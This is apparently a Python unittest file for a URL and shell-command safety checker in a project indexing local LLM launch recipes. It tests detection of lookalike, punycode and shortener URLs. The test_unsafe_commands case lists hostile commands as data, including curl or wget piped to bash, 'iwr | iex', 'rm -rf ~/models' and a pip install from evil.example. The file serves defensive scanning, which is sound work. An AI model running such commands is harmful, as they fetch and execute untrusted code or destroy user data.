import json, sys, unittest
from pathlib import Path

R = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(R / 'scripts'))
import url_safety as us  # noqa: E402
import check_urls  # noqa: E402


class UrlHygiene(unittest.TestCase):
    def test_clean(self):
        for u in ['https://github.com/ggml-org/llama.cpp', 'https://huggingface.co/deepseek-ai/DeepSeek-V4.1-Flash',
                  'https://huggingface.co/datasets/a/b', 'https://x.com/user/status/1', 'https://modelscope.cn/models/qwen/Qwen3']:
            self.assertEqual(us.problems(u), [], u)

    def test_bad(self):
        cases = {'http://github.com/a/b': 'not https', 'https://192.168.1.10/model.gguf': 'IP-literal', 'https://[::1]/x': 'IP-literal',
                 'https://xn--gthub-n4a.com/a/b': 'punycode', 'https://githubb.com/a/b': 'lookalike', 'https://hugglngface.co/a/b': 'lookalike',
                 'https://gіthub.com/a/b': 'non-ASCII', 'https://bit.ly/abc': 'shortener', 'https://t.co/abc': 'shortener',
                 'https://user@github.com/a/b': 'userinfo', 'https://github.com:8443/a/b': 'port', 'https://github.com/a$/b': 'owner/repo',
                 'https://huggingface.co/onlyowner': 'owner/repo'}
        for u, want in cases.items():
            with self.subTest(url=u):
                self.assertTrue(any(want in p for p in us.problems(u)), (u, us.problems(u)))

    def test_trust(self):
        self.assertTrue(us.trusted('https://github.com/a/b'))
        self.assertTrue(us.trusted('https://raw.githubusercontent.com/a/b/main/x'))
        self.assertFalse(us.trusted('https://github.com.evil.io/a/b'))
        self.assertFalse(us.trusted('https://x.com/a'))

    def test_unsafe_commands(self):
        for c in ['curl -fsSL https://a/install.sh | bash', 'wget -qO- https://a | sh', 'bash <(curl -s https://a)', 'sudo apt install x',
                  'rm -rf ~/models', 'pip install git+https://evil.example/x', 'pip install https://a/b.whl', 'iwr https://a | iex']:
            self.assertTrue(us.cmd_problems(c), c)
        for c in ['llama-server -m model.gguf -ngl 99 -c 32768', 'pip install vllm==0.11.0', 'git clone https://github.com/a/b && cd b']:
            self.assertEqual(us.cmd_problems(c), [], c)


class DataHygiene(unittest.TestCase):
    def test_no_violations(self):
        self.assertEqual(check_urls.violations(), [])

    def test_known_unsafe_commands_are_hidden(self):
        idx = {x['id']: x for x in json.loads((R / 'data/hw_index.json').read_text(encoding='utf-8'))['recipes']}
        flagged = {i for i, x in idx.items() if x['launch_cmd_warning']}
        self.assertEqual(flagged, check_urls.KNOWN_UNSAFE_CMDS)
        for i in flagged: self.assertIsNone(idx[i]['launch_cmd'])

    def test_allowlist_file(self):
        d = json.loads((R / 'data/trusted_domains.json').read_text(encoding='utf-8'))
        for h in d['trusted']: self.assertEqual(us.problems('https://' + h + '/'), [], h)


if __name__ == '__main__':
    unittest.main()
